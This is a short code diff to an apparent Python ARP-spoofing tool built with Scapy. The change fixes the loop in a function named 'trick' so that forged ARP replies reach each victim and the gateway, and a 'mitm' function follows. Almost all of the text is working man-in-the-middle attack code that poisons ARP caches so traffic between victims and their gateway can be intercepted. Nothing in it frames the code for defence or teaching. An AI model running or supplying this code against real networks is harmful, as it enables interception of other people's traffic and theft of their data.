@@ -66,7 +66,7 @@ def reARP():
 
 def trick(gm, vm):
     for i in range(0, len(victimIP)):
-        send(ARP(op=2, psrc=gatewayIP, pdst=victimIP, hwdst=vm))
+        send(ARP(op=2, psrc=gatewayIP, pdst=victimIP[i], hwdst=vm))
         send(ARP(op=2, psrc=victimIP[i], pdst=gatewayIP, hwdst=gm))
 
 def mitm():
